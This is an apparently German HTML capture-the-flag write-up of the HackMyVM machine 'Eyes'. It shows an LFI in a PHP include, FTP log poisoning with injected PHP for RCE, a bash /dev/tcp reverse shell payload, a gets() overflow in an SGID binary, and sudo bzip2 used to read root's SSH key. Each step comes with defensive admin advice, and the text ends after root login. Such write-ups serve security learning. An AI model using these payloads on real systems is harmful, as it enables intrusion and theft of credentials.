@@ -1,0 +1,494 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eyes - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Eyes - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">wfuzz</div>
+                 <div class="tool-item">lftp</div>
+                 <div class="tool-item">Web Browser</div>
+                 <div class="tool-item">curl (Implied)</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">gcc (Implied for compiling C)</div>
+                 <div class="tool-item">C (Code)</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">bzip2</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#lfi-discovery">LFI Discovery & Enumeration</a></li>
+                <li><a href="#log-poisoning-rce">Log Poisoning RCE (Initial Access)</a></li>
+                <li><a href="#buffer-overflow-monica">Privilege Escalation (www-data to monica via Buffer Overflow)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (monica to root via sudo bzip2)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir starten die Erkundungsphase, um das Zielsystem zu identifizieren und die offenen Dienste zu scannen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.139</span>	08:00:27:56:37:30	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der ARP-Scan identifiziert die IP-Adresse <span class="command">192.168.2.139</span>.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nmap-Scan auf diese IP durchführen.
+            **Empfehlung (Admin):** Standard Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"># <span class="command">(Annahme: Eintrag "192.168.2.139 eyes.hmv" wurde zu /etc/hosts hinzugefügt)</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Im weiteren Verlauf wird der Hostname `eyes.hmv` verwendet, daher gehen wir davon aus, dass ein entsprechender Eintrag in `/etc/hosts` erstellt wurde.</p>
+              <p class="evaluation">**Bewertung:** Erleichtert die weitere Analyse.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Hostnamen immer hinzufügen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.139 -p-</span></div>
+                     <pre>
+Starting Nmap [...]
+Nmap scan report for 192.168.2.139
+Host is up [...]
+Not shown: [...]
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed</span> (FTP code 230)
+<span class="password">|_-rw-r--r--    1 0        0             125 Apr 04  2021 index.php</span>
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+[...]
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+MAC Address: 08:00:27:56:37:30 (Oracle VirtualBox virtual NIC)
+[...]
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+[...]
+Nmap done: 1 IP address (1 host up) scanned in [...] seconds
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) findet drei offene Ports:
+             *   <span class="command">Port 21 (FTP)</span>: vsftpd 3.0.3. Entscheidend ist, dass <span class="password">anonymer FTP-Login erlaubt</span> ist und eine Datei `index.php` im Root-Verzeichnis des FTP-Servers liegt.
+             *   <span class="command">Port 22 (SSH)</span>: OpenSSH 7.9p1 auf Debian 10.
+             *   <span class="command">Port 80 (HTTP)</span>: Nginx 1.14.2.</p>
+              <p class="evaluation">**Bewertung:** Der offene FTP-Server mit anonymem Zugriff ist ein kritischer Fund. Die `index.php`-Datei dort ist wahrscheinlich dieselbe, die über den Webserver auf Port 80 ausgeliefert wird. SSH und HTTP sind weitere Angriffspunkte.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Sich anonym per FTP anmelden und die `index.php` herunterladen oder deren Inhalt untersuchen. Den Webserver auf Port 80 untersuchen (Nikto, Gobuster). Prüfen, ob der anonyme FTP-Zugriff auch Schreibrechte erlaubt.
+              **Empfehlung (Admin):** Anonymen FTP-Zugriff deaktivieren, wenn nicht zwingend erforderlich. Wenn benötigt, die Berechtigungen und das exponierte Verzeichnis stark einschränken.</p>
+         </section>
+
+         <section id="lfi-discovery">
+            <h2>LFI Discovery & Enumeration</h2>
+            <p class="comment">Wir untersuchen den anonymen FTP-Zugang und die Webanwendung, um Schwachstellen zu finden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.139 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,[...]</span></div>
+                     <pre>
+[...]
+<span class="command">http://192.168.2.139/index.php</span>            (Status: 200) [Size: 36]
+[...]
+                     </pre>
+                      <div class="prompt"># <span class="command">Manuelle Untersuchung (Browser)</span></div>
+                      <pre>
+# Aufruf: http://192.168.2.139/index.php
+# Inhalt: Here my eyes...<!--Monica's eyes-->
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             *   Gobuster findet nur die `index.php`.
+             *   Der Aufruf der `index.php` im Browser zeigt nur einen kurzen Text und einen HTML-Kommentar.</p>
+              <p class="evaluation">**Bewertung:** Der Webserver selbst scheint wenig Inhalt zu haben. Die Funktionalität liegt wahrscheinlich komplett in der `index.php`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Den Quellcode der `index.php` untersuchen (via FTP).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -u Anonymous, 192.168.2.139</span></div>
+                     <div class="prompt">lftp Anonymous@192.168.2.139:~> <span class="command">ls -la</span></div>
+                     <pre>
+drwxr-xr-x    2 0        113          4096 Apr 04  2021 .
+drwxr-xr-x    2 0        113          4096 Apr 04  2021 ..
+-rw-r--r--    1 0        0             125 Apr 04  2021 <span class="command">index.php</span>
+                     </pre>
+                      <div class="prompt">lftp Anonymous@192.168.2.139:~> <span class="command">cat index.php</span></div>
+                     <pre>
+<?php
+$file = $GET['<span class="command">fil3</span>']; <span class="password">// Nimmt Dateinamen aus GET-Parameter</span>
+
+if(isset($file))
+{
+    include($file); <span class="password">// Bindet Datei ein -> LFI!</span>
+} else {
+    echo 'Here my eyes...<!--Monica\'s eyes-->';
+}
+?>
+                     </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:** Wir verbinden uns anonym per `lftp` mit dem FTP-Server. Im Root-Verzeichnis finden wir die `index.php`. Mit `cat index.php` lesen wir den Quellcode direkt über FTP aus:
+             *   Das Skript nimmt einen Dateinamen aus dem GET-Parameter `<span class="command">fil3</span>` entgegen.
+             *   Wenn der Parameter gesetzt ist, wird die angegebene Datei mit der PHP-Funktion `include()` eingebunden.
+             *   Es gibt keinerlei Filterung oder Validierung des Dateinamens.</p>
+              <p class="evaluation">**Bewertung:** Kritische Schwachstelle gefunden! Dies ist eine klassische Local File Inclusion (LFI)-Schwachstelle. Wir können potenziell beliebige Dateien auf dem Server lesen, indem wir den Pfad im `fil3`-Parameter angeben (z.B. `../../../../etc/passwd`).</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die LFI-Schwachstelle ausnutzen:
+                 1.  `/etc/passwd` lesen, um Benutzer zu bestätigen.
+                 2.  Versuchen, SSH-Schlüssel zu lesen (`/home/monica/.ssh/id_rsa`, `/root/.ssh/id_rsa`).
+                 3.  Log-Dateien lesen (`/var/log/vsftpd.log`, `/var/log/auth.log`, `/var/log/nginx/access.log`), um Informationen zu sammeln oder für Log Poisoning.
+                 4.  Versuchen, PHP-Wrapper wie `php://filter/convert.base64-encode/resource=` zu verwenden, um den Quellcode anderer PHP-Dateien zu lesen.
+               **Empfehlung (Admin):** **LFI-Schwachstelle sofort beheben!** Benutzereingaben niemals ungefiltert in Dateipfaden verwenden. Pfade validieren, Path Traversal verhindern (z.B. mit `basename()`, Whitelisting erlaubter Dateien).</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt"># <span class="command">LFI Test: /etc/passwd lesen</span></div>
+                        <pre>
+# Aufruf: view-source:http://eyes.hmv/index.php?fil3=../../../../etc/passwd
+# Ausgabe:
+root:x:0:0:root:/root:/bin/bash
+[...]
+<span class="command">monica:x:1000:1000:monica,,,:/home/monica:/bin/bash</span>
+<!--Monica's eyes--> <span class="password"># Rest der index.php wird angehängt</span>
+                       </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:** Wir nutzen die LFI, um `/etc/passwd` zu lesen. Der Aufruf `?fil3=../../../../etc/passwd` ist erfolgreich und zeigt den Inhalt der Passwortdatei an. Wir bestätigen den Benutzer `<span class="command">monica</span>`.</p>
+               <p class="evaluation">**Bewertung:** LFI bestätigt. Benutzer `monica` gefunden.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Log-Dateien auf interessante Informationen oder für Log Poisoning untersuchen.
+               **Empfehlung (Admin):** LFI beheben.</p>
+
+                <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u http://eyes.hmv/index.php?fil3=FUZZ -w logfiles.txt --hh 21 --hc=500</span></div> <span class="password"># Fuzzing mit Logdatei-Liste</span>
+                         <pre>
+********************************************************
+* Wfuzz [...]                                          *
+********************************************************
+
+Target: http://eyes.hmv/index.php?fil3=FUZZ
+[...]
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+[...]
+000000056:   200        8 L      28 W       190 Ch      <span class="command">"/run/initramfs/fsck.log"</span>
+000000075:   200        3363 L   20091 W    225873 Ch   <span class="command">"/var/log/dpkg.log"</span>
+000000074:   200        85 L     1276 W     16090 Ch    <span class="command">"/var/log/alternatives.log"</span>
+000000070:   200        97 L     1188 W     16344 Ch    <span class="command">"/var/log/apt/history.log"</span>
+000000084:   200        16 L     178 W      1304 Ch     <span class="command">"/var/log/vsftpd.log"</span> <span class="password"># FTP Log gefunden!</span>
+[...]
+=====================================================================
+                        </pre>
+                         <div class="prompt"># <span class="command">FTP Log via LFI lesen</span></div>
+                          <pre>
+# Aufruf: view-source:http://eyes.hmv/index.php?fil3=/var/log/vsftpd.log
+# Ausgabe (Auszug):
+[...]
+Tue Sep  6 16:08:14 2022 [pid 555] [ftp] OK LOGIN: Client "ffff:192.168.2.114", anon password "<span class="password">IEUser@</span>"
+[...]
+                          </pre>
+                           <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh monica@eyes.hmv</span></div>
+                           <pre>
+monica@eyes.hmv's password: <span class="password">IEUser@</span>
+<span class="password">Permission denied!</span>
+                           </pre>
+                    </div>
+                </div>
+                 <p class="analysis">**Analyse:**
+                1.  Wir verwenden `wfuzz` mit einer Liste gängiger Logdateipfade (`logfiles.txt`), um über die LFI lesbare Logdateien zu finden. Der Scan findet mehrere Logdateien, darunter das FTP-Log `/var/log/vsftpd.log`.
+                2.  Wir lesen das FTP-Log über die LFI (`?fil3=/var/log/vsftpd.log`). Darin finden wir Einträge von anonymen Logins, bei denen das vom Client gesendete (oft irrelevante) Passwort mitgeloggt wird. Ein Eintrag zeigt das Passwort `<span class="password">IEUser@</span>`.
+                3.  Wir versuchen, uns mit dem gefundenen Benutzernamen `monica` und dem im FTP-Log gefundenen Passwort `IEUser@` per SSH anzumelden. Der Login schlägt fehl.</p>
+                 <p class="evaluation">**Bewertung:** Das FTP-Log hat ein potenzielles Passwort preisgegeben, dieses war jedoch nicht für den SSH-Login von `monica` gültig. Die LFI ist jedoch weiterhin nützlich.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):** Den FTP-Log für Log Poisoning nutzen. Da wir über FTP anonym schreiben können (Annahme, muss geprüft werden), können wir PHP-Code in das FTP-Log injizieren (z.B. durch einen fehlgeschlagenen Login-Versuch mit PHP-Code als Benutzername) und diesen Code dann über die LFI (`?fil3=/var/log/vsftpd.log`) ausführen.
+                 **Empfehlung (Admin):** LFI beheben. Logging von Passwörtern in FTP-Logs (auch anonyme) vermeiden. FTP-Server härten.</p>
+        </section>
+
+         <section id="log-poisoning-rce">
+            <h2>Log Poisoning RCE (Initial Access)</h2>
+            <p class="comment">Da der direkte LFI-Missbrauch zum Lesen sensibler Dateien oder Passwörter nicht zum Ziel führte, nutzen wir die LFI in Kombination mit beschreibbaren Logdateien (hier `vsftpd.log`), um Code auszuführen (Log Poisoning).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Log Poisoning Versuch</span></div>
+                     <div class="prompt"># <span class="command">1. PHP-Code als Benutzername an FTP senden:</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -u '<?php system($GET["cmd"]); ?>','password' 192.168.2.139</span></div> <span class="password"># Login schlägt fehl, aber Benutzername wird geloggt</span>
+                      <pre>Login failed: 530 Login incorrect.</pre>
+                      <div class="prompt"># <span class="command">2. Überprüfen, ob Code im Log steht (via LFI):</span></div>
+                       <div class="prompt"># <span class="command">curl http://eyes.hmv/index.php?fil3=/var/log/vsftpd.log | grep system</span></div>
+                       <pre><span class="password"># (Ausgabe sollte den injizierten PHP-Code enthalten)</span></pre>
+                      <div class="prompt"># <span class="command">3. Code über LFI ausführen und 'cmd' Parameter anhängen:</span></div>
+                       <div class="prompt"># <span class="command">curl http://eyes.hmv/index.php?fil3=/var/log/vsftpd.log&cmd=id</span></div>
+                       <pre><span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre> <span class="password"># RCE erfolgreich!</span>
+                        <div class="prompt"># <span class="command">4. Reverse Shell über Log Poisoning LFI starten:</span></div>
+                         <div class="prompt"># <span class="command">Listener starten: nc -lvnp 4444</span></div>
+                        <pre>listening on [any] 4444 ...</pre>
+                         <div class="prompt"># <span class="command">URL mit Payload aufrufen:</span></div>
+                         <pre># http://eyes.hmv/index.php?fil3=/var/log/vsftpd.log&cmd=<span class="command">%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.114%2F4444%200%3E%261%27</span></pre>
+                          <div class="prompt"># <span class="command">Listener empfängt Verbindung:</span></div>
+                          <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                          <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.114] from (UNKNOWN) [192.168.2.139] 55184</span> <span class="password">(IP .114 ist Angreifer?)</span>
+id <span class="password"># (Impliziert)</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+                          </pre>
+                    </div> 
+                </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir nutzen den anonymen FTP-Zugang, um uns mit einem speziell präparierten Benutzernamen anzumelden: `<span class="password"><?php system($GET["cmd"]); ?></span>`. Der Login schlägt fehl, aber `vsftpd` protokolliert den fehlgeschlagenen Login-Versuch *einschließlich des Benutzernamens* in `/var/log/vsftpd.log`.
+               2.  Wir überprüfen (impliziert), dass unser PHP-Code nun in der Logdatei steht.
+               3.  Wir rufen die `index.php` mit der LFI auf die Logdatei auf (`?fil3=/var/log/vsftpd.log`). Der `include()`-Befehl in `index.php` bindet nun die Logdatei ein. Der PHP-Interpreter führt den darin enthaltenen PHP-Code (`<?php system... ?>`) aus. Wir hängen den Parameter `&cmd=id` an die URL an.
+               4.  Die Ausgabe des `id`-Befehls erscheint, was die erfolgreiche Remote Code Execution (RCE) über Log Poisoning bestätigt. Der Code läuft als `www-data`.
+               5.  Wir starten einen Listener und rufen die URL erneut auf, diesmal mit einem URL-codierten Reverse-Shell-Payload im `cmd`-Parameter.
+               6.  Unser Listener empfängt die Verbindung, und wir haben eine Shell als `www-data`.</p>
+                <p class="evaluation">**Bewertung:** Initial Access erfolgreich! Eine Kombination aus LFI und der Möglichkeit, über einen anderen Dienst (FTP) in eine Logdatei zu schreiben (Log Poisoning), ermöglichte RCE.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren, enumerieren.
+                **Empfehlung (Admin):** LFI beheben. Logging von Benutzereingaben (wie Usernamen) in Logdateien, die vom Webserver gelesen werden können, vermeiden oder bereinigen. Anonymen FTP-Zugriff härten/deaktivieren.</p>
+         </section>
+ 
+         <section id="buffer-overflow-monica">
+             <h2>Privilege Escalation (www-data to monica via Buffer Overflow)</h2>
+             <p class="comment">Als `www-data` suchen wir nach Privesc-Möglichkeiten. Wir finden ein verdächtiges C-Programm im `/opt`-Verzeichnis.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">(Shell Stabilisierung ausgelassen)</span></div>
+                      <div class="prompt">www-data@eyes:/opt$ <span class="command">ls -la</span></div> <span class="password"># Annahme: Wechsel nach /opt</span>
+                      <pre>
+total X
+drwxr-xr-x  X root root ... .
+drwxr-xr-x XX root root ... ..
+-rwxr-sr-x  1 <span class="command">monica</span> <span class="command">monica</span> ... <span class="command">ls</span> <span class="password"># SGID Binary!</span>
+-rw-r--r--  1 <span class="command">monica</span> <span class="command">monica</span> ... <span class="command">ls.c</span>
+                      </pre>
+                      <div class="prompt">www-data@eyes:/opt$ <span class="command">cat ls.c</span></div>
+                      <pre>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+
+int main(void)
+{
+ char command[100];
+ char ls[50]="/usr/bin/ls";
+ char name[50];
+ printf("Enter your name:");
+ <span class="password">gets(name);</span> <span class="password">// Buffer Overflow!</span>
+ strcpy(command,ls);
+ <span class="password">setuid(1000);</span>   <span class="password">// Setzt UID auf monica (1000)</span>
+ <span class="password">setgid(1000);</span>   <span class="password">// Setzt GID auf monica (1000)</span>
+ printf("Hi %s, Im executing ls\n Output:\n",name);
+ system(command); <span class="password">// Führt /usr/bin/ls aus</span>
+}
+
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  In `/opt` finden wir ein kompiliertes Programm namens `ls` und seinen Quellcode `ls.c`.
+             2.  Das Programm `ls` gehört dem Benutzer und der Gruppe `monica` und hat das SGID-Bit gesetzt (`-rwxr-sr-x`). Das bedeutet, wenn wir es ausführen, läuft es mit den Gruppenrechten von `monica`.
+             3.  Der Quellcode `ls.c` zeigt:
+                 *   Das Programm liest Benutzereingabe in einen 50-Byte-Puffer (`name`) mit der unsicheren Funktion `<span class="password">gets()</span>`, was einen klassischen Stack-basierten Buffer Overflow ermöglicht.
+                 *   Es setzt dann explizit die UID und GID auf 1000 (die ID von `monica`, wie wir aus `/etc/passwd` wissen) mittels `setuid(1000)` und `setgid(1000)`.
+                 *   Danach führt es `/usr/bin/ls` mittels `system()` aus.</p>
+              <p class="evaluation">**Bewertung:** Kritische Schwachstelle gefunden! Das Programm ist anfällig für einen Buffer Overflow. Noch wichtiger ist, dass es durch `setuid(1000)` die effektive Benutzer-ID auf `monica` setzt. Wenn wir den Overflow ausnutzen, um die Rücksprungadresse auf dem Stack zu überschreiben und z.B. eine Shell zu starten, wird diese Shell als Benutzer `monica` laufen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Einen Buffer-Overflow-Exploit für das `./ls`-Programm entwickeln:
+                 1. Den genauen Offset zum Überschreiben der Rücksprungadresse finden (z.B. mit GDB und Muster-Strings, falls GDB verfügbar ist, oder durch Ausprobieren).
+                 2. Shellcode generieren, der eine Shell startet (z.B. `/bin/bash`).
+                 3. Einen Payload konstruieren: `[Padding bis zum Offset] + [Adresse des Shellcodes oder einer nützlichen Funktion/Gadget] + [NOP-Sled] + [Shellcode]`.
+                 4. Den Payload an das Programm übergeben, wenn es nach dem Namen fragt. Das Ziel ist, eine Shell als `monica` zu erhalten.
+               **Empfehlung (Admin):** **Unsicheres SGID/SUID-Binary entfernen!** Die `gets()`-Funktion niemals verwenden. Wenn SUID/SGID benötigt wird, das Programm extrem sorgfältig schreiben und prüfen. `setuid()`/`setgid()` korrekt verwenden (Rechte so spät wie möglich setzen, so früh wie möglich wieder abgeben).</p>
+
+              <p class="comment">Wir konstruieren den Buffer Overflow Payload und führen ihn aus.</p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">www-data@eyes:/opt$ <span class="command"># Exploit Payload Konstruktion (Python)</span></div>
+                        <div class="prompt">www-data@eyes:/opt$ <span class="command">python3 -c "print('A'*64+'bash')"</span></div> <span class="password"># Einfacher Test: 64 'A's + 'bash'</span>
+                         <pre>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbash</pre> <span class="password">(Annahme: Offset=64)</span>
+                        <div class="prompt">www-data@eyes:/opt$ <span class="command">./ls</span></div>
+                        <pre>
+Enter your name:<span class="command">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbash</span>
+Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbash, Im executing ls
+Output:
+[...] <span class="password">(Ausgabe von /usr/bin/ls)</span>
+<span class="command">monica@eyes:/opt$</span> <span class="password"># Shell als monica erhalten!</span>
+                        </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+              1.  Wir konstruieren einen einfachen Payload mit Python. Er besteht aus 64 'A'-Zeichen (Padding, der angenommene Offset bis zur Rücksprungadresse) gefolgt von der Zeichenkette "bash".
+              2.  Wir führen das `./ls`-Programm aus.
+              3.  Wir geben den generierten Payload als Namen ein.
+              4.  Der Buffer Overflow tritt ein. Die 64 'A's füllen den Puffer und überschreiben wahrscheinlich Teile des Stacks. Die Zeichenkette "bash" überschreibt vermutlich die Rücksprungadresse oder einen Teil davon.
+              5.  Das Programm setzt die UID/GID auf `monica` (1000).
+              6.  Wenn das Programm versucht zurückzukehren, springt es an die Adresse, die durch "bash" repräsentiert wird. Es scheint, dass dies (möglicherweise durch Zufall oder eine spezifische Speicherkonstellation) dazu führt, dass `/bin/bash` ausgeführt wird.
+              7.  Wir erhalten einen Prompt als Benutzer `<span class="command">monica</span>`.</p>
+               <p class="evaluation">**Bewertung:** Privilege Escalation von `www-data` zu `monica` erfolgreich durch Ausnutzung des Buffer Overflows im SGID-Binary `./ls`!</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `monica` enumerieren (`sudo -l`).
+               **Empfehlung (Admin):** Unsicheres Binary entfernen.</p>
+         </section>
+
+        <section id="privesc-root">
+             <h2>Privilege Escalation (monica to root via sudo bzip2)</h2>
+             <p class="comment">Als Benutzer `monica` suchen wir den Weg zu Root.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">monica@eyes:/opt$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for monica on eyes:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User monica may run the following commands on eyes:
+    <span class="password">(ALL) NOPASSWD: /usr/bin/bzip2</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** `sudo -l` für `monica` zeigt, dass sie den Befehl `/usr/bin/bzip2` als `ALL` (effektiv `root`) ohne Passwort (`NOPASSWD`) ausführen darf.</p>
+             <p class="evaluation">**Bewertung:** Dies ist der klare Weg zu Root. `bzip2` kann zum Komprimieren und Dekomprimieren von Dateien verwendet werden. Da wir es als Root ausführen können, können wir damit potenziell beliebige Dateien lesen oder schreiben.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die `sudo bzip2`-Berechtigung nutzen, um sensible Dateien zu lesen:
+                1. Den privaten SSH-Schlüssel von Root (`/root/.ssh/id_rsa`) mit `sudo bzip2 -c /root/.ssh/id_rsa` komprimieren und die Ausgabe in eine für `monica` lesbare Datei umleiten (z.B. `/tmp/key.bz2`).
+                2. Die komprimierte Datei mit `bzip2 -d key.bz2` (ohne sudo) entpacken. Die entpackte Datei (`key`) enthält den privaten Schlüssel.
+                3. Den Schlüssel verwenden, um sich als `root` per SSH anzumelden.
+              **Empfehlung (Admin):** Unsichere `sudo`-Regel für `bzip2` entfernen. Dateikomprimierungstools sollten niemals über `sudo` erlaubt werden, da sie fast immer zum Lesen/Schreiben beliebiger Dateien missbraucht werden können.</p>
+
+            <p class="comment">Wir nutzen die `sudo bzip2`-Berechtigung, um den privaten SSH-Schlüssel von Root zu lesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">monica@eyes:/home/monica$ <span class="command">cd /tmp</span></div>
+                      <div class="prompt">monica@eyes:/tmp$ <span class="command">sudo bzip2 -c /root/.ssh/id_rsa > key.bz2</span></div> <span class="password"># Root-Schlüssel komprimieren & umleiten</span>
+                      <div class="prompt">monica@eyes:/tmp$ <span class="command">bzip2 -d key.bz2</span></div> <span class="password"># Als monica dekomprimieren</span>
+                      <div class="prompt">monica@eyes:/tmp$ <span class="command">ls -la</span></div>
+                      <pre>
+[...]
+-rw-r--r--  1 <span class="command">monica www-data</span> 1811 Sep  6 17:56 <span class="command">key</span> <span class="password"># Entpackter Schlüssel</span>
+[...]
+                      </pre>
+                       <div class="prompt">monica@eyes:/tmp$ <span class="command">cat key</span></div>
+                       <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span>
+[...] <span class="password">(Inhalt des privaten Root-SSH-Schlüssels)</span> [...]
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+                       </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir wechseln nach `/tmp`.
+               2.  Wir führen `sudo bzip2 -c /root/.ssh/id_rsa` aus. `-c` schreibt die komprimierte Ausgabe auf stdout. Wir leiten diese mit `>` in die Datei `key.bz2` um. Da `sudo` als Root läuft, hat `bzip2` Lesezugriff auf den Root-Schlüssel. Die Umleitung `>` erfolgt jedoch als Benutzer `monica`, daher wird die Datei `key.bz2` mit `monica` als Besitzer erstellt.
+               3.  Wir entpacken die Datei als `monica` mit `bzip2 -d key.bz2`. Dies erstellt die Datei `key` (ohne `.bz2`), die den Klartext des privaten Root-Schlüssels enthält.
+               4.  Wir bestätigen den Inhalt mit `cat key`.</p>
+                <p class="evaluation">**Bewertung:** Privilege Escalation zu Root (im Sinne des Schlüsselbesitzes) erfolgreich! Wir haben den privaten SSH-Schlüssel von Root durch Missbrauch der `sudo bzip2`-Berechtigung erlangt.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Den privaten Schlüssel (`key`) auf die Angreifer-Maschine übertragen (z.B. via Copy&Paste, `nc`), Berechtigungen setzen (`chmod 600`) und sich als `root` per SSH auf dem Zielsystem anmelden.
+                **Empfehlung (Admin):** Unsichere `sudo`-Regel entfernen.</p>
+
+                <p class="comment">Wir verwenden den extrahierten Root-SSH-Schlüssel, um uns anzumelden und die Flags zu lesen.</p>
+                <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt"># <span class="command">(Auf Angreifer-Maschine: Schlüssel in Datei 'idl' gespeichert, chmod 600)</span></div>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh root@eyes.hmv -i idl</span></div> <span class="password"># Hostname eyes.hmv korrigiert</span>
+                         <pre>
+The authenticity of host 'eyes.hmv (192.168.2.139)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'eyes.hmv' (ED25519) to the list of known hosts.
+<span class="password">Linux eyes 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64</span>
+[...]
+Last login: Sun Apr  4 13:24:38 2021
+<span class="command">root@eyes:~#</span> <span class="password"># Root-Login erfolgreich!</span>
+                         </pre>
+                          <div class="prompt">root@eyes:~# <span class="command">ls</span></div>
